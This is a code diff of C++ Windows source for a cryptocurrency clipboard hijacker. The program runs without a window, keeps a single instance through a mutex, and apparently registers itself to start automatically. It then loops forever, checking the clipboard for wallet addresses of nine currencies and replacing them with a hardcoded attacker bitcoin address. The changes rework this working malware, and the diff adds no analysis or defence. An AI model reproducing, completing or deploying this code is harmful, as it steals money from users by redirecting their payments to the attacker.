@@ -1,6 +1,7 @@
 #include <string>
 #include <atlstr.h>
 #include <winuser.h>
+#include <windows.h>
 #include <regex>
 
 #pragma comment(lib, "user32.lib")
@@ -16,55 +17,53 @@ void autoranner();
 
 
 string crypto = "15DQ4VCLvidYRsPjVKwxgntFrta16Kgikv";
+string data1;
+string data2;
 
-
-void main()
+void WINAPI main()
 {
 #pragma comment(linker, "/SYBSYSTEM:windows, /ENTRY:mainCRTStartup " )
-	HANDLE hijeck = CreateMutex(NULL, false, L"My_programm_Already_Present");
-	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	char MUTEX_NAME[] = "MUTEX_NAME";
+	//FreeConsole();
+
+	if (OpenMutex(MUTEX_ALL_ACCESS, 0, (LPCWSTR)MUTEX_NAME))
 	{
-		MessageBoxW(NULL, L"The program is already running", L"Error", MB_SYSTEMMODAL | MB_ICONERROR);
-		CloseHandle(hijeck);
+		exit(EXIT_FAILURE);
 	}
+	CreateMutex(0, 0, (LPCWSTR)MUTEX_NAME);
 	autoranner();
-	Reactor();
+	while (true)
+	{
+		Reactor();
+	}
+	
 	
 }
 
 void checkers(string& data)
 {
-	bool flag = false;
-	cmatch res;
-	regex btc("(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)");
-	regex eth1("(?:^0x[a - fA - F0 - 9]{40}$)");
-	regex xmr("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)");
-	regex xlm("(?:^G[0-9a-zA-Z]{55}$)");
-	regex xrp("(?:^r[0-9a-zA-Z]{24,34}$)");
-	regex ltc("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)");
-	regex nec("(?:^A[0-9a-zA-Z]{33}$)");
-	regex bch("^((bitcoincash:)?(q|p)[a-z0-9]{41})");
-	regex dash("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)");
-	regex arr[9]{ btc, eth1, xmr, xlm, xrp, ltc, nec, bch, dash };
-	if (flag == false)
-	{
-		for (int i = 0; i <= 8; i++)
-		{
-			bool g = regex_match(data.c_str(), res, arr[i]);
-			if (g)
-			{
-				Writebuffer(crypto);
-				flag = true;
 
-			}
+	static cmatch res;
+	static regex btc("(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)");
+	static regex eth1("(?:^0x[a - fA - F0 - 9]{40}$)");
+	static regex xmr("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)");
+	static regex xlm("(?:^G[0-9a-zA-Z]{55}$)");
+	static regex xrp("(?:^r[0-9a-zA-Z]{24,34}$)");
+	static regex ltc("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)");
+	static regex nec("(?:^A[0-9a-zA-Z]{33}$)");
+	static regex bch("^((bitcoincash:)?(q|p)[a-z0-9]{41})");
+	static regex dash("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)");
+	static regex arr[9]{ btc, eth1, xmr, xlm, xrp, ltc, nec, bch, dash };
+	for (int i = 0; i <= 8; i++)
+	{
+		bool g = regex_match(data.c_str(), res, arr[i]);
+		if (g)
+		{
+			Writebuffer(crypto);
+			break;
+
 		}
 	}
-	else
-
-	{
-		Reactor();
-	}
-
 }
 
 void autoranner()
@@ -78,38 +77,17 @@ void autoranner()
 
 void Reactor()
 {
-	string data1="";
-	string data2 = Readbuffer();
-	if (data2 != data1)
+
+	if (IsClipboardFormatAvailable(CF_TEXT))
 	{
-		if (IsClipboardFormatAvailable(CF_TEXT))
+		if (OpenClipboard(NULL))
 		{
-			if (OpenClipboard(NULL))
-			{
 
-				Readbuffer();
-				data1 = Readbuffer();
-				CloseClipboard();
-				
-				
-
-
-			}
-			Sleep(2000);
+			Readbuffer();
+			CloseClipboard();
 		}
-		Reactor();
-		
+		Sleep(2000);
 	}
-	else
-	{
-		data2 = "";
-		data1 = "";
-		Reactor();
-	}
-	
-	
-	
-	
 }
 
 string Readbuffer()
@@ -144,6 +122,6 @@ void Writebuffer(string& crypto)
 		SetClipboardData(CF_TEXT, buffer);
 		CloseClipboard();
 		Sleep(2000);
-		Reactor();
+
 	}
 }
